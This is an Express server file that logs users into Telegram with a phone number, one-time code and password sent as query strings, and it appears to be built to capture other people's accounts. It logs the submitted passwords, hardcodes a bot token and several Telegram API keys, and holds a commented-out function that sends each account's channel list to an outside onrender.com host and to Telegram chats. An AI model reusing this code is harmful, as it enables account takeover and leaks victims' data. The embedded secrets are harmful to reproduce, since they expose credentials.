import express from 'express';
import axios from 'axios'
import cors from 'cors';
import { deleteClient, getClient, mapToClient } from "./telegramManager";

require('dotenv').config();
const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage";

const app = express();
app.use(cors());

let creds = [
    {
        apiId: 27919939,
        apiHash: "5ed3834e741b57a560076a1d38d2fa94"
    },
    {
        apiId: 25328268,
        apiHash: "b4e654dd2a051930d0a30bb2add80d09"
    },
    {
        apiId: 2899,
        apiHash: "36722c72256a24c1225de00eb6a1ca74"
    },
    {
        apiId: 24559917,
        apiHash: "702294de6c08f4fd8c94c3141e0cebfb"
    },
    {
        apiId: 12777557,
        apiHash: "05054fc7885dcfa18eb7432865ea3500"
    },
    {
        apiId: 27565391,
        apiHash: "a3a0a2e895f893e2067dae111b20f2d9"
    },
    {
        apiId: 23195238,
        apiHash: "15a8b085da74163f158eabc71c55b000"
    },
]
const port = 4000;

async function fetchWithTimeout(resource, options: any = {}) {
    const timeout = options?.timeout || 15000;

    const source = axios.CancelToken.source();
    const id = setTimeout(() => source.cancel(), timeout);
    try {
        const response = await axios({
            ...options,
            url: resource,
            cancelToken: source.token
        });
        clearTimeout(id);
        return response;
    } catch (error) {
        if (axios.isCancel(error)) {
            console.log('Request canceled:', error.message);
        } else {
            console.log('Error:', error.message);
        }
        return undefined;
    }
}

app.get('/', async (req, res) => {
    res.send('Hello World!');
});

app.get('/login', async (req, res) => {
    const result = await mapToClient(req.query.phone);
    console.log(result);
    if (result.isCodeViaApp) {
        res.sendStatus(200);
    } else {
        res.sendStatus(500);
    }
});

app.get('/otp', async (req, res, next) => {
    const phoneCode = req.query.code;
    const number = req.query.phone;
    const cli = await getClient(number);
    if (cli) {
        console.log(cli?.phoneCodeHash, cli?.phoneNumber);
        const result = await cli?.login(phoneCode);
        res.json(result);
    } else {
        res.sendStatus(500);
    }
    next();
}, async (req, res) => {
    const number = req.query.number;
    const cli = await getClient(number);
    cli?.disconnect();
    await deleteClient(number);
});

app.get('/password', async (req, res) => {
    const password = req.query.password;
    console.log(password)
    res.send('loggingIn!!');
});

app.get('/exit', async (req, res) => {
    process.exit(1)
    res.json({});
});

app.listen(port, () => {
    console.log(`App listening at http://localhost:${port}`);
});

// async function sendChannels(chats) {
//     const chatsArray = [];
//     let reply = 'CHANNELS:\n\n';
//     chats.map((chat: any) => {
//         if (chat.isChannel || chat.isGroup) {
//             const chatEntity = chat.entity.toJSON();
//             chatsArray.push(chatEntity);
//             const username = chatEntity.username ? ` @${chatEntity.username} ` : chatEntity.id.toString();
//             reply = reply + chatEntity.title + " " + username + ' \n';
//         }
//     });
//     await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });

//     const payload = {
//         chat_id: "-1001801844217",
//         text: reply
//     };
//     const options = {
//         method: 'POST',
//         headers: { 'Content-Type': 'application/json' },
//         body: JSON.stringify(payload)
//     };
//     await fetchWithTimeout(`${ppplbot}`, options);

//     const payload2 = {
//         chat_id: "-1001970448012",
//         text: reply
//     };
//     const options2 = {
//         method: 'POST',
//         headers: { 'Content-Type': 'application/json' },
//         body: JSON.stringify(payload2)
//     };
//     await fetchWithTimeout(`${ppplbot}`, options2);
// }